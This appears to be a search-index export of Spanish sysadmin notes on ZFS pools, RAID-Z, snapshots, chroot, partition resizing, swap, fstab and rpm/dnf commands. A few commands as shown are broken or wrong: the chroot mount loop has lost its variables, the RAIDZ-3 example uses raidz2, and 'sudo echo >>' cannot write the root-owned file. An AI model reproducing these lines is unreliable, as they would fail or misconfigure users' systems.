r\u00e1pido) a 9 (mejor relaci\u00f3n de compresi\u00f3n). Dependiendo del algoritmo y de la compresi\u00f3n de los datos, tener la compresi\u00f3n habilitada puede incluso aumentar el rendimiento. Comprimir dataset existente En el caso de tener un dataset sin compresi\u00f3n activada y activarla, los archivos existentes no se comprimen, solo los nuevos. En este caso hay que sobresscribir todo el dataset. # activar compresion zfs set compress = on tank/dataset # replicar dataset zfs send -R tank/dataset | zfs recv tank/newDataset # eliminar el antiguo y renombrar zfs destroy -r tank/dataset zfs rename tank/newDataset tank/dataset","title":"ZFS"},{"location":"sistemas/ZFS/#zfs","text":"Doc oracle zfs man zpool man zfs apt install zfsutils-linux zfs-dkms IMPORTANTE : No usar ZFS sobre controladoras hardware, puesto que tienen su propia cach\u00e9. ZFS necesita comunicarse directamente con los discos.","title":"ZFS"},{"location":"sistemas/ZFS/#niveles-de-raid-soportados","text":"El sistema ZFS, soporta los siguientes tipos de RAID, los RAID-Z son una variacion de Raid5 RAID0 RAID1 RAID10 RAIDZ-1 (min 3 discos, paridad simple) RAIDZ-2 (min 4 discos, paridad doble) RAIDZ-3 (min 5 discos, paridad triple)","title":"Niveles de RAID soportados"},{"location":"sistemas/ZFS/#gestion-de-zpools","text":"Visualizaci\u00f3n de zpool zpool status # ver estado el pool zpool list # ver la capacidad de los discos zfs list # ver los volumenes dentro de zpool zpool history # ver historial de comandos zpool get all # ver propiedades del pool","title":"Gesti\u00f3n de Zpools"},{"location":"sistemas/ZFS/#crear-zpool","text":"doc oracle sobre esta secci\u00f3n RAID0 o \"Striping\" No a\u00f1ade redundancia, por lo que un fallo en un disco supone un fallo en el RAID completo. Sin embargo, si que mejora la velocidad de Lectura/Escritura. zpool create -f <NombrePool> <Disco> <Disco> [ <Disco> <Disco> <Disco> ... ] zpool create -f tank /dev/vdb /dev/vdc RAID1 o \"Mirroring\" Como m\u00ednimo necesitaremos 2 discos de la misma capacidad. La capacidad resultante ser\u00e1 la de un solo disco. zpool create -f <NombrePool> mirror <Disco1> <Disco2> zpool create -f tank mirror /dev/vdb /dev/vdc RAID10 El resultado ser\u00e1 un RAID0 sobre varios RAID1. Su capacidad ser\u00e1 la suma de capacidades de todos los RAID1 que lo compongan. zpool create -f <NombrePool> mirror <Disco1> <Disco2> mirror <Disco1> <Disco2> [ mirror <Disco1> <Disco2> ... ] zpool create -f tank mirror /dev/vdb /dev/vdc mirror /dev/vdd /dev/vde RAIDZ-1 El RAID-Z1, es similar a un RAID5 con paridad simple, requiere al menos 3 discos. zpool create -f <NombrePool> raidz1 <Disco1> <Disco2> <Disco3> zpool create -f tank raidz1 /dev/vdb /dev/vdc /dev/vdd RAIDZ-2 El RAID-Z2, es similar a un RAID5 con paridad doble, requiere al menos 4 discos. zpool create -f <NombrePool> raidz2 <Disco1> <Disco2> <Disco3> <Disco4> zpool create -f tank raidz2 /dev/vd[b-e] RAIDZ-3 El RAID-Z3, es similar a un RAID5 con paridad triple, requiere al menos 5 discos. zpool create -f <NombrePool> raidz3 <Disco1> <Disco2> <Disco3> <Disco4> <Disco5> zpool create -f tank raidz2 /dev/vd[b-f]","title":"Crear zpool"},{"location":"sistemas/ZFS/#visualizar-estato","text":"zpool status # ver estado el pool zpool list # ver la capacidad de los discos zfs list # ver los volumenes dentro de zpool zpool history # ver historial de comandos zpool get all # ver propiedades del pool","title":"Visualizar estato"},{"location":"sistemas/ZFS/#discos-adicionales","text":"","title":"Discos adicionales"},{"location":"sistemas/ZFS/#disco-de-log","text":"Podemos a\u00f1adir un disco adicional para logs: zpool create -f <NombrePool> <ElRaidQueSea> log <Disco> # crear pool con disco de log zpool add -f <NombrePool> log <Disco> # a\u00f1adir disco cache de pool ya creado","title":"Disco de log"},{"location":"sistemas/ZFS/#disco-cache","text":"Para acelerar la lectura y escritura en el RAID, podemos usar un disco cach\u00e9. Obviamente esto tiene sentido con discos SSD: zpool create -f <NombrePool> <ElRaidQueSea> cache <Disco> # crear pool con disco de cache zpool add -f <NombrePool> cache <Disco> # a\u00f1adir disco cache a pool ya creado","title":"Disco cach\u00e9"},{"location":"sistemas/ZFS/#disco-spare","text":"zpool create -f <NombrePool> <ElRaidQueSea> spare <Disco> # crear pool con disco de spare zpool add -f <NombrePool> spare <Disco> # a\u00f1adir disco spare a pool ya creado","title":"Disco spare"},{"location":"sistemas/ZFS/#quitar-disco-adicional","text":"zpool remove tank /dev/vdg # remove solo funciona con discos spare, cache, log, ...","title":"Quitar disco adicional"},{"location":"sistemas/ZFS/#modificar-un-zpool","text":"","title":"Modificar un Zpool"},{"location":"sistemas/ZFS/#anadirquitar-discos-a-mirror","text":"zpool create -f tank mirrot /dev/vdb /dev/vdc # creaci\u00f3n de mirror simple zpool status ... config: NAME STATE READ WRITE CKSUM tank ONLINE 0 0 0 mirror-0 ONLINE 0 0 0 vdb ONLINE 0 0 0 vdc ONLINE 0 0 0 zpool attach tank /dev/vdb /dev/vdd # a\u00f1adir disco a mirror zpool offline tank /dev/vdd # poner disco offline (simular un fallo) zpool detach tank /dev/vdd # retirar disco La opci\u00f3n attach no se puede utilizar directamente sobre raidz*, se tendr\u00e1 que utilizar replace","title":"A\u00f1adir/Quitar discos a mirror"},{"location":"sistemas/ZFS/#cambio-disco-fallido-n-raidz-con-spare","text":"En este ejemplo se muestra como seria el cambio de un disco que a fallado en un raidz2 con spare zpool create -f tank raidz2 /dev/vd [ b-e ] spare /dev/vd [ fg ] # creaci\u00f3n de raidz2 con 2 discos spare zpool status NAME STATE READ WRITE CKSUM tank ONLINE 0 0 0 raidz2-0 ONLINE 0 0 0 vdb ONLINE 0 0 0 vdc ONLINE 0 0 0 vdd ONLINE 0 0 0 vde ONLINE 0 0 0 spares vdf AVAIL vdg AVAIL --- zpool offline tank vdc # simulo fallo de disco vdc zpool status NAME STATE READ WRITE CKSUM tank DEGRADED 0 0 0 raidz2-0 DEGRADED 0 0 0 vdb ONLINE 0 0 0 vdc OFFLINE 0 0 0 vdd ONLINE 0 0 0 vde ONLINE 0 0 0 spares vdg AVAIL vdf AVAIL --- zpool replace tank vdc vdf # remplazo disco vdc offline por vdf en spare zpool status NAME STATE READ WRITE CKSUM tank DEGRADED 0 0 0 raidz2-0 DEGRADED 0 0 0 vdb ONLINE 0 0 0 spare-1 DEGRADED 0 0 0 vdc OFFLINE 0 0 0 vdf ONLINE 0 0 0 vdd ONLINE 0 0 0 vde ONLINE 0 0 0 spares vdg AVAIL vdf INUSE currently in use --- zpool detach tank vdc # quito disco da\u00f1ado vdc zpool status NAME STATE READ WRITE CKSUM tank ONLINE 0 0 0 raidz2-0 ONLINE 0 0 0 vdb ONLINE 0 0 0 vdf ONLINE 0 0 0 vdd ONLINE 0 0 0 vde ONLINE 0 0 0 spares vdg AVAIL --- zpool add tank spare vdc # pongo vdc reparado como spare zpool status NAME STATE READ WRITE CKSUM tank ONLINE 0 0 0 raidz2-0 ONLINE 0 0 0 vdb ONLINE 0 0 0 vdf ONLINE 0 0 0 vdd ONLINE 0 0 0 vde ONLINE 0 0 0 spares vdg AVAIL vdc AVAIL","title":"cambio disco fallido n raidz con spare"},{"location":"sistemas/ZFS/#cambio-de-disco-a-raidz","text":"En este ejemplo se muestra el cambio de un disco en un raidz2 sin spare Primero de todo simulamos el fallo de un disco poniendolo offline zpool offline tank vdd zpool status NAME STATE READ WRITE CKSUM tank DEGRADED 0 0 0 raidz2-0 DEGRADED 0 0 0 vdb ONLINE 0 0 0 vdc ONLINE 0 0 0 vdd OFFLINE 0 0 0 vde ONLINE 0 0 0 vdf ONLINE 0 0 0 vdg ONLINE 0 0 0 En este paso ya podemos desmontar y retirar el disco de la m\u00e1quina y poner uno nuevo. Una vez insertado el disco nuevo en la m\u00e1quina con zpool replace lo volvemos a poner online en el pool zpool replace tank /dev/vdd zpool status NAME STATE READ WRITE CKSUM tank ONLINE 0 0 0 raidz2-0 ONLINE 0 0 0 vdb ONLINE 0 0 0 vdc ONLINE 0 0 0 vdd ONLINE 0 0 0 vde ONLINE 0 0 0 vdf ONLINE 0 0 0 vdg ONLINE 0 0 0","title":"Cambio de disco a raidz"},{"location":"sistemas/ZFS/#aumentarreducir-raidz","text":"Actualmente en la versio de OpenZFS 2.1 no se puede canviar el modo de raidz, aun que anuncian para 3.0 en 2022 esa funcionalidad. De momento solo podemos hacer un snapshot de los datos, destruir el el zpool, crear uno nuevo y volver a volcar el snapshot zfs snapshot tank/documents@backup zfs send -cpe tank/documents@backup > backup.documnts zpool destroy tank zpool create -f tank raidz2 /dev/vd [ b-g ] zfs recv tank/documents < backup.documnts zfs list NAME USED AVAIL REFER MOUNTPOINT tank 357K 7 .42G 44 .0K /tank tank/documents 90 .9K 7 .42G 90 .9K /tank/documents","title":"Aumentar/Reducir raidz"},{"location":"sistemas/ZFS/#migracion","text":"doc oracle sobre esta secci\u00f3n La opci\u00f3n export marca los discos como que se esta iniciando una migraci\u00f3n y entre otras cosas purga cualquier dato no escrito en el disco ( hace un sync) zpool export tank Una vez exportado el pool ya se pueden extraer los discos e llevarlos a otro nas Para detectar las agrupaciones disponibles, ejecute el comando zpool import sin opciones. Por ejemplo: zpool import # ver pools disponibles zpool import tank # importar pool tank (tambien se puede indicar con nel id) zpool import tank zelda # importar renombrando zfs set mountpoint = /zelda zelda # canviar punto de montaje podr\u00e1s ver el id de un pool con zpool status o zpool import","title":"Migraci\u00f3n"},{"location":"sistemas/ZFS/#destruccion","text":"zpool destroy dozer # destruir un pool zpool import -D # ver pools destridos zpool import -Df dozer # forzar importci\u00f3n pool dozer zpool status -x # visualizar pool en mal estado pool: dozer state: DEGRADED status: One or more devices could not be opened. Sufficient replicas exist for the pool to continue functioning in a degraded state. action: Attach the missing device and online it using 'zpool online' . see: http://www.sun.com/msg/ZFS-8000-2Q scrub: scrub completed after 0h0m with 0 errors on Thu Jan 21 15 :38:48 2010 config: NAME STATE READ WRITE CKSUM dozer DEGRADED 0 0 0 raidz2-0 DEGRADED 0 0 0 c2t8d0 ONLINE 0 0 0 c2t9d0 ONLINE 0 0 0 c2t10d0 ONLINE 0 0 0 c2t11d0 UNAVAIL 0 37 0 cannot open c2t12d0 ONLINE 0 0 0 errors: No known data errors zpool online dozer c2t11d0 # reactivar disco Bringing device c2t11d0 online zpool status -x all pools are healthy","title":"Destrucci\u00f3n"},{"location":"sistemas/ZFS/#anadir-notificaciones-por-e-mail","text":"Instalamos el servicio que se encargar\u00e1 de monitorizar los eventos del m\u00f3dulo de kernel ZFS. Este servicio puede enviar emails cuando ocurran errores en alguna pool. apt-get install zfs-zed Para activar el demonio, debemos configurar el correo: nano /etc/zfs/zed.d/zed.rc ZED_EMAIL_ADDR=\"avisos@correo.es\"","title":"A\u00f1adir notificaciones por e-Mail."},{"location":"sistemas/ZFS/#propiedades-de-un-pool","text":"doc oracle sobre esta secci\u00f3n Definir tama\u00f1o de sector Para un comportamiento \u00f3ptimo de la unidad ZFS, el tama\u00f1o del sector de la Pool (ashift), debe ser mayor o igual que el tama\u00f1o del sector en los discos que la componen. Para configurarlo, lo har\u00edamos de la siguiente forma: zpool create -f -o ashift = 12 <NombrePool> <ElRaidQueSea> zpool create -f -m /tank tank /dev/vdb # crear volumenes -f force vdevs zpool scrub tank # a\u00f1adir control de fallos al volumen zpool history # ver historial de comandos","title":"Propiedades de un pool"},{"location":"sistemas/ZFS/#volumenes","text":"","title":"Volumenes"},{"location":"sistemas/ZFS/#crear-volumen","text":"zfs create tank/documents zfs destroy tank/documents zfs create -o compression = on tank/documents","title":"Crear volumen"},{"location":"sistemas/ZFS/#snapshot","text":"zfs snapshot tank/documents@backup zfs list -t snapshot ll /tank/documents/.zfs/snapshot/backup zfs rollback tank/documents@backup zfs destroy tank/documents@backup -n no-action -v verbose -r recursive ( clones... )","title":"Snapshot"},{"location":"sistemas/ZFS/#enviar-snapshot","text":"zfs send -cpev tank/dana@snap1 | ssh host2 zfs recv newtank/dana # enviar snap # -c compress # -p Informaci\u00f3n verbosa sobre el paquete de transmisi\u00f3n generado. # -e Generate a more compact stream # -v vervose zfs send -i tank/dana@snap1 tank/dana@snap2 | ssh host2 zfs recv -F newtank/dana # enviar icremental snap # -F forzar rollback a la instantanea mas reciente antes de recibir # enviar datast con todos los snapshots zfs send -R tank/dataset@snapMasReciente | ssh <ip> zfs recv tank/dataset","title":"Enviar snapshot"},{"location":"sistemas/ZFS/#propiedades","text":"doc oracle sobre esta secci\u00f3n Se pueden ver todas las propiedades en man zfsprops zfs get all tank/documents # ver opciones zfs set compression = on tank/documents zfs set atime = off # Controla si el tiempo de acceso a los archivos se actualiza cuando se leen zfs set atime = off relatime = on zelda Una vez creada la unidad ZFS, es posible usar compresi\u00f3n en este almacenamiento zfs set compression = lz4 <NombrePool> zfs set compression = off <NombrePool> Se recomienda usar el algoritmo lz4, ya que agrega muy poca sobrecarga de CPU. Tambi\u00e9n est\u00e1n disponibles otros algoritmos como lzjb y gzip-N, donde N es un n\u00famero entero de 1 (m\u00e1s r\u00e1pido) a 9 (mejor relaci\u00f3n de compresi\u00f3n). Dependiendo del algoritmo y de la compresi\u00f3n de los datos, tener la compresi\u00f3n habilitada puede incluso aumentar el rendimiento.","title":"Propiedades"},{"location":"sistemas/ZFS/#comprimir-dataset-existente","text":"En el caso de tener un dataset sin compresi\u00f3n activada y activarla, los archivos existentes no se comprimen, solo los nuevos. En este caso hay que sobresscribir todo el dataset. # activar compresion zfs set compress = on tank/dataset # replicar dataset zfs send -R tank/dataset | zfs recv tank/newDataset # eliminar el antiguo y renombrar zfs destroy -r tank/dataset zfs rename tank/newDataset tank/dataset","title":"Comprimir dataset existente"},{"location":"sistemas/chroot/","text":"Chroot Chroot nos permite acceder a una partici\u00f3n como root de la misma. Montamos la partici\u00f3n como /mnt sudo mount /dev/<partici\u00f3n> /mnt Montamos las carpetas necesarias para ser root en /mnt for i in /dev /dev/pts /proc /sys ; do sudo mount -B i /mnti ; done Nos convertimos en root y accedemos a la carpeta. chroot /mnt cd /mnt Ya somos root en la partici\u00f3n indicada.","title":"Chroot"},{"location":"sistemas/chroot/#chroot","text":"Chroot nos permite acceder a una partici\u00f3n como root de la misma. Montamos la partici\u00f3n como /mnt sudo mount /dev/<partici\u00f3n> /mnt Montamos las carpetas necesarias para ser root en /mnt for i in /dev /dev/pts /proc /sys ; do sudo mount -B i /mnti ; done Nos convertimos en root y accedemos a la carpeta. chroot /mnt cd /mnt Ya somos root en la partici\u00f3n indicada.","title":"Chroot"},{"location":"sistemas/disco/","text":"Disco Dispositivos de bloque fd0, hd, sda leen y escriben de 512 bits en 512. Dispositivos caracteres tty, consola msdos 4 particiones primarias 1 de ellas puede ser extendida, esta dise\u00f1ada para contener mas particiones las particiones en el interior de la extendida se denominan logicas y la primera sera sda5. extendida puede contenes hasta un maximo de 16 particiones. fs filesystem Existen muchos tipos de sistemas de ficheros, seg\u00fan que quiera administrar en ese sisema de archivos formateare con uno o otro, hay sistemas optimizados para diferentes tipos de archivos, peque\u00f1os, grandes, etc.. swap El funcionamiento de la partici\u00f3n swap consiste en impedir que el ordenador se bloquee facilitando un espacio extra a la ram. Una vez la ram se queda sin espacio o est\u00e1 pr\u00e1cticamente llena utiliza el swap una partici\u00f3n del disco dedicada para insertar los procesos que cree ella menos importantes y en desuso. Problemas del uso de swap, el principal que la velocidad de disco es de 10 millones de veces m\u00e1s lenta que de ram por lo tanto se ralentiza el pc considerablemente. Por defecto fedora empieza a utilizar swap cuando la ram est\u00e1 a un 40% de su capacidad, y lo ideal es cambiarlo a 10% o 0%. En este caso tendremos un uso m\u00e1s fluido de nuestro pc y usar\u00e1 el swap cuando realmente est\u00e9s forzando el pc. Utilidades de partici\u00f3n swap: swapon -a # montar swap definida en fstab swapoff -a # desmontar todas las swap mkswap /dev/sdax # asignar sistema de fichero swap a particion swaplabel /dev/sdax myswap # asignar label a swap Proceso para cambiar el %: mirar c\u00f3mo est\u00e1 el %. sudo sysctl -a | grep vm.swappiness modificar permanentemente. sudo echo vm.swappiness = 10 >> /etc/sysctl.conf guardar cambio sudo sysctl -p Activar / desactivar swap Se puede activar o desactivar el swap corriendo el peligro de que si fuerces el pc te quedes colgado con el comando swapon, swapoff. sudo swapon /dev/<disco> # activa la partici\u00f3n swap sudo swapoff /dev/<disco> # desactiva la partici\u00f3n swap Se puede ver que puntos de montaje hay en nuestro pc en /etc/fstab , hay compruebas que realmente est\u00e1 el punto de montaje con el disco deseado mediante nombre de disco o UID la opci\u00f3n default es el acceso est\u00e1ndar, se puede restringir a solo lectura o solo acceso para 1 usuario etc.. opciones en $ man fstab Particiones UUID universal unic identificador Las particiones se identifican con un UUID, cada vez que se crea o formatea cambiara dicho UUID. ls -l /dev/sda* brw-rw---- 1 root disk 8 , 0 abr 1 15 :04 /dev/sda brw-rw---- 1 root disk 8 , 1 abr 1 15 :04 /dev/sda1 brw-rw---- 1 root disk 8 , 2 abr 1 15 :04 /dev/sda2 el numero 8 es el tipo de dispositivo, 0 es la partici\u00f3n Existen diferentes tipos de imagenes, raw para crudo, iso tipo cd y dvd, qcow2, vdi, etc.. para maquinas virtuales. dd if = /dev/zero of = disc01.img bs = 1k count = 500k # crear imagen de 500M losetup -f # primer loop disponible losetup /dev/loop0 disc01.img # montar imagen losetup -d /dev/loop0 /dev/loop1 # desmontar imagen losetup -D locate label | grep bin # identificar comandos label e2label /dev/sda7 Home # asignar label en particion ext* mount -o remount,rw /dev/loop0 /mnt/linux # remontar un sistema de archivos mount -o ro /dev/loop0 /mnt # montar en read only mount /dev/loop0 /mnt/m01 # montar loop0 en /mnt/linux mount -r -B /mnt/m01 /mnt/linux # montar directorio /mnt/m01 en /mnt/linux como read-only fsck escanea devices Modificaciones resize2fs /dev/sda8 # ampliar fs maximo resize2fs /dev/sda8 1G # modificar a 1G de tama\u00f1o resize2fs -M /dev/sda8 # reducir el maximo posible e2fsck -f /dev/sda8 # comprovar errores sistema de ficheros Ampliar parici\u00f3n Para ampliar una partici\u00f3n primero hacemos crecer la partici\u00f3n y despues el sistema de archivos. para modificar la partici\u00f3n tiene que estar desmontada, mpero en cambio para ampliar el sistema de ficheros no es necesario. Para hacer crecer la partici\u00f3n curiosamente se tiene que borrar, pero antes hay que recordar el sector donde empieza, mirar con fdisk -l . /dev/sda8 614408192 618602495 4194304 2G 83 Linux en esta ejemplo la particion empieza en el sector 614408192 Entonces eliminamos la partici\u00f3n , y creamos una que empieza en el sector indicado y acaba en el tama\u00f1o que quieras, siempre que este libre. Una vez ampliada la partici\u00f3n hay que extender el sistema de archivos con resize2fs /dev/sda8 . para finalizar siempre despues de un resize comprovar fs con e2fsck -f /dev/sda8 Reducir partici\u00f3n Reducir una partici\u00f3n no se puede hacer en caliente, por lo tanto hay que desmontarla primero. Primero hay que reducir el sistema de archivos para no perder datos, y seg\u00fan hasta que tama\u00f1o se hallan reducido , sera el m\u00e1ximo que podremos reducir la partici\u00f3n. Reducir la partici\u00f3n a 1G resize2fs /dev/sda8 1G En el caso de queer reducir el m\u00e1ximo posible resize2fs -M /dev/sda8 Comprovar file sistem e2fsck -f /dev/sda8 Pasamos a eliminar la partici\u00f3n y crear una nueva de 1G empezando or el primer sector de la borrada con fdisk Ya tenemos nuestra particion redimensionada, solo falta montar. Iso El formato del sistema de ficheros iso es iso9660 . Si queremos explorar el contenido de una iso, montamos la imagen en un loop dispopnible. losetup /dev/loop0 imagen_a_montar.iso para despu\u00e9s montarla en /mnt . Una vez montada si quieres modificarla se tiene que copiar todo el contenido en otro directorio y crear una nueva imagen. cp -ra contenido_imagen destino # crear nueva imagen genisoimage -o nueva_imagen.iso directorio fstab device mount-point fs-type options dump fscheck # <file system> <mount point> <type> <options> <dump> <pass> /dev/sda5 / ext4 errors = remount-ro 0 1 Device Es el identificador del dispositivo que montar. Las diferentes formas de identificar son: /dev/sdax # nombre particion UUID = 854f5443... # Uid completo de particion LABEL = sistema # label de partici\u00f3n /dev/sr0 # cdrom/dvd 192 .168.88.10:/ruta # dispositivo de red nfs /mnt/imagen.raw # imagen en ruta del sistema Mount point Punto de montaje donde se montara el sistema de ficheros. Fs-type Tipo de sistema de ficheros a montar ext4, swap, ntfs, msdos, vfat, iso9660, etc... auto intenta reconocer el sistema de ficheros. Options Diferentes opciones de montaje de file sistem. default Englova las siguientes opciones: rw, suid, dev, exec, auto, nouser, and async ro, rw Solo lectura o lectura y escritura. noauto no se montara autom\u00e1ticamente en el arranque del sistema ni con mount -a user, users users : cualquier usuario puede montar y desmontar una linea la opci\u00f3n users, indiferentemente quien lo aya montado. user : puede montar cualquier usuario, pero solo el usuario que lo monta puede desmontarlo. noexec no se pueden ejecutar archivos en esa partici\u00f3n. sync async async utiliza bufers para el uso de tareas en el disco, sync no utiliza bufers y escribe al momento. Dump Utilizado por el programa dump , sirve para hacer una copia de seguridad. 0 no hace respaldo 1 crea el respaldo siempre que tengas dump instalado y configurado. fscheck Es el orden de chequear los puntos de montaje en el arranque del sistema. 0 no se chequea 1 se chequea al primero 2 el segundo. En el caso de que hayan 2 discos pueden haber dos opciones 1, ya que al ser discos diferentes se pueden chequear a la vez.","title":"Disco"},{"location":"sistemas/disco/#disco","text":"Dispositivos de bloque fd0, hd, sda leen y escriben de 512 bits en 512. Dispositivos caracteres tty, consola msdos 4 particiones primarias 1 de ellas puede ser extendida, esta dise\u00f1ada para contener mas particiones las particiones en el interior de la extendida se denominan logicas y la primera sera sda5. extendida puede contenes hasta un maximo de 16 particiones.","title":"Disco"},{"location":"sistemas/disco/#fs-filesystem","text":"Existen muchos tipos de sistemas de ficheros, seg\u00fan que quiera administrar en ese sisema de archivos formateare con uno o otro, hay sistemas optimizados para diferentes tipos de archivos, peque\u00f1os, grandes, etc..","title":"fs filesystem"},{"location":"sistemas/disco/#swap","text":"El funcionamiento de la partici\u00f3n swap consiste en impedir que el ordenador se bloquee facilitando un espacio extra a la ram. Una vez la ram se queda sin espacio o est\u00e1 pr\u00e1cticamente llena utiliza el swap una partici\u00f3n del disco dedicada para insertar los procesos que cree ella menos importantes y en desuso. Problemas del uso de swap, el principal que la velocidad de disco es de 10 millones de veces m\u00e1s lenta que de ram por lo tanto se ralentiza el pc considerablemente. Por defecto fedora empieza a utilizar swap cuando la ram est\u00e1 a un 40% de su capacidad, y lo ideal es cambiarlo a 10% o 0%. En este caso tendremos un uso m\u00e1s fluido de nuestro pc y usar\u00e1 el swap cuando realmente est\u00e9s forzando el pc. Utilidades de partici\u00f3n swap: swapon -a # montar swap definida en fstab swapoff -a # desmontar todas las swap mkswap /dev/sdax # asignar sistema de fichero swap a particion swaplabel /dev/sdax myswap # asignar label a swap Proceso para cambiar el %: mirar c\u00f3mo est\u00e1 el %. sudo sysctl -a | grep vm.swappiness modificar permanentemente. sudo echo vm.swappiness = 10 >> /etc/sysctl.conf guardar cambio sudo sysctl -p","title":"swap"},{"location":"sistemas/disco/#activar-desactivar-swap","text":"Se puede activar o desactivar el swap corriendo el peligro de que si fuerces el pc te quedes colgado con el comando swapon, swapoff. sudo swapon /dev/<disco> # activa la partici\u00f3n swap sudo swapoff /dev/<disco> # desactiva la partici\u00f3n swap Se puede ver que puntos de montaje hay en nuestro pc en /etc/fstab , hay compruebas que realmente est\u00e1 el punto de montaje con el disco deseado mediante nombre de disco o UID la opci\u00f3n default es el acceso est\u00e1ndar, se puede restringir a solo lectura o solo acceso para 1 usuario etc.. opciones en $ man fstab","title":"Activar / desactivar swap"},{"location":"sistemas/disco/#particiones","text":"UUID universal unic identificador Las particiones se identifican con un UUID, cada vez que se crea o formatea cambiara dicho UUID. ls -l /dev/sda* brw-rw---- 1 root disk 8 , 0 abr 1 15 :04 /dev/sda brw-rw---- 1 root disk 8 , 1 abr 1 15 :04 /dev/sda1 brw-rw---- 1 root disk 8 , 2 abr 1 15 :04 /dev/sda2 el numero 8 es el tipo de dispositivo, 0 es la partici\u00f3n Existen diferentes tipos de imagenes, raw para crudo, iso tipo cd y dvd, qcow2, vdi, etc.. para maquinas virtuales. dd if = /dev/zero of = disc01.img bs = 1k count = 500k # crear imagen de 500M losetup -f # primer loop disponible losetup /dev/loop0 disc01.img # montar imagen losetup -d /dev/loop0 /dev/loop1 # desmontar imagen losetup -D locate label | grep bin # identificar comandos label e2label /dev/sda7 Home # asignar label en particion ext* mount -o remount,rw /dev/loop0 /mnt/linux # remontar un sistema de archivos mount -o ro /dev/loop0 /mnt # montar en read only mount /dev/loop0 /mnt/m01 # montar loop0 en /mnt/linux mount -r -B /mnt/m01 /mnt/linux # montar directorio /mnt/m01 en /mnt/linux como read-only fsck escanea devices","title":"Particiones"},{"location":"sistemas/disco/#modificaciones","text":"resize2fs /dev/sda8 # ampliar fs maximo resize2fs /dev/sda8 1G # modificar a 1G de tama\u00f1o resize2fs -M /dev/sda8 # reducir el maximo posible e2fsck -f /dev/sda8 # comprovar errores sistema de ficheros","title":"Modificaciones"},{"location":"sistemas/disco/#ampliar-paricion","text":"Para ampliar una partici\u00f3n primero hacemos crecer la partici\u00f3n y despues el sistema de archivos. para modificar la partici\u00f3n tiene que estar desmontada, mpero en cambio para ampliar el sistema de ficheros no es necesario. Para hacer crecer la partici\u00f3n curiosamente se tiene que borrar, pero antes hay que recordar el sector donde empieza, mirar con fdisk -l . /dev/sda8 614408192 618602495 4194304 2G 83 Linux en esta ejemplo la particion empieza en el sector 614408192 Entonces eliminamos la partici\u00f3n , y creamos una que empieza en el sector indicado y acaba en el tama\u00f1o que quieras, siempre que este libre. Una vez ampliada la partici\u00f3n hay que extender el sistema de archivos con resize2fs /dev/sda8 . para finalizar siempre despues de un resize comprovar fs con e2fsck -f /dev/sda8","title":"Ampliar parici\u00f3n"},{"location":"sistemas/disco/#reducir-particion","text":"Reducir una partici\u00f3n no se puede hacer en caliente, por lo tanto hay que desmontarla primero. Primero hay que reducir el sistema de archivos para no perder datos, y seg\u00fan hasta que tama\u00f1o se hallan reducido , sera el m\u00e1ximo que podremos reducir la partici\u00f3n. Reducir la partici\u00f3n a 1G resize2fs /dev/sda8 1G En el caso de queer reducir el m\u00e1ximo posible resize2fs -M /dev/sda8 Comprovar file sistem e2fsck -f /dev/sda8 Pasamos a eliminar la partici\u00f3n y crear una nueva de 1G empezando or el primer sector de la borrada con fdisk Ya tenemos nuestra particion redimensionada, solo falta montar.","title":"Reducir partici\u00f3n"},{"location":"sistemas/disco/#iso","text":"El formato del sistema de ficheros iso es iso9660 . Si queremos explorar el contenido de una iso, montamos la imagen en un loop dispopnible. losetup /dev/loop0 imagen_a_montar.iso para despu\u00e9s montarla en /mnt . Una vez montada si quieres modificarla se tiene que copiar todo el contenido en otro directorio y crear una nueva imagen. cp -ra contenido_imagen destino # crear nueva imagen genisoimage -o nueva_imagen.iso directorio","title":"Iso"},{"location":"sistemas/disco/#fstab","text":"device mount-point fs-type options dump fscheck # <file system> <mount point> <type> <options> <dump> <pass> /dev/sda5 / ext4 errors = remount-ro 0 1 Device Es el identificador del dispositivo que montar. Las diferentes formas de identificar son: /dev/sdax # nombre particion UUID = 854f5443... # Uid completo de particion LABEL = sistema # label de partici\u00f3n /dev/sr0 # cdrom/dvd 192 .168.88.10:/ruta # dispositivo de red nfs /mnt/imagen.raw # imagen en ruta del sistema Mount point Punto de montaje donde se montara el sistema de ficheros. Fs-type Tipo de sistema de ficheros a montar ext4, swap, ntfs, msdos, vfat, iso9660, etc... auto intenta reconocer el sistema de ficheros. Options Diferentes opciones de montaje de file sistem. default Englova las siguientes opciones: rw, suid, dev, exec, auto, nouser, and async ro, rw Solo lectura o lectura y escritura. noauto no se montara autom\u00e1ticamente en el arranque del sistema ni con mount -a user, users users : cualquier usuario puede montar y desmontar una linea la opci\u00f3n users, indiferentemente quien lo aya montado. user : puede montar cualquier usuario, pero solo el usuario que lo monta puede desmontarlo. noexec no se pueden ejecutar archivos en esa partici\u00f3n. sync async async utiliza bufers para el uso de tareas en el disco, sync no utiliza bufers y escribe al momento. Dump Utilizado por el programa dump , sirve para hacer una copia de seguridad. 0 no hace respaldo 1 crea el respaldo siempre que tengas dump instalado y configurado. fscheck Es el orden de chequear los puntos de montaje en el arranque del sistema. 0 no se chequea 1 se chequea al primero 2 el segundo. En el caso de que hayan 2 discos pueden haber dos opciones 1, ya que al ser discos diferentes se pueden chequear a la vez.","title":"fstab"},{"location":"sistemas/gestores_de_paquetes/","text":"Gestores de paquetes Paquetes rpm Los paquetes rpm se encuentran en los repositorios que se guardan en /etc/yum.repos.d . Querys rpm -qa # paquetes instalados rpm -ql paquete # ver contenido de paquete instalado rpm -qlp paquete.rpm # ver contenido de paquete sin instalar rpm -qd paquete # ver paquetes de documentaci\u00f3n rpm -qc paquete # ver paquetes de configuraci\u00f3n rpm -qi paquete # informaci\u00f3n del paquete rpm -qp --requires paquete.rpm # ver dependencias del paquete rpm -qp --scripts paquete.rpm # ver scripts pre y post intalaci\u00f3n rpm -qf /usr/bin/useradd # ver a que paquete pertenece un archivo La opci\u00f3n -p es para cuando el paquete esta en el directorio actual rpm -q --whatrequires dhclient # ver quepaquetes usan el indicado NetworkManager-1.2.6-1.fc24.x86_64 dracut-network-044-21.fc24.x86_64 Manejo de rpm rpm -i paquete.rpm # instala paquete rpm -U paquete.rpm # actualizar paquete rpm -e paquete.rpm # eliminar paquete rpm --rebuilddb # actualizar base de datos rpm # -vh permiten visualizar vel progreso en las opciones anteriores. rpm -ivh tftp-server-5.2-18.fc24.x86_64.rpm Preparing... ################################# [100%] Updating / installing... 1 :tftp-server-5.2-18.fc24 ################################# [100%] dnf dnf list installed # ver paquetes instalados dnf provides orden # ver a que paquete pertenece una orden dnf download paquete # descargar un paquete dnf search paquete # buscar paquete en repositorios dnf update # actualizar repositorios dnf upgrade # actualizar systema dnf dist-upgrade # actualizar distribucion dnf install 